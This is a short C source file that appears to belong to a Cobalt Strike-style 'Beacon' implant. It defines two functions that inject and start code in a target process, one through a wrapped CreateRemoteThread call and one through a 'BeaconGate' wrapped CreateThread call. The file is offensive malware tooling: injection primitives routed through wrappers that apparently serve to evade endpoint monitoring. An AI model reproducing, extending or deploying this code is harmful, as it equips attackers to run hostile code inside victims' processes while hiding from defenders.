#include <stdlib.h>
#include "syscalls.h"
#include <stdio.h>
#include <windows.h>
#include "beacon_gate.h" /* BeaconGate: gate_* = the API with the gate in front */
#include <Tlhelp32.h>
#include "beacon.h"
#include "inject.h"

BOOL inject_via_remotethread(HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter) {
	/* kick it off */
	return (beacon_CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpStartAddress, lpParameter, 0, NULL) != NULL);
}

BOOL inject_via_createthread(HANDLE hProcess, DWORD pid, LPVOID lpStartAddress, LPVOID lpParameter) {
	return (gate_CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)((char *)lpStartAddress), lpParameter, 0, NULL) != NULL);
}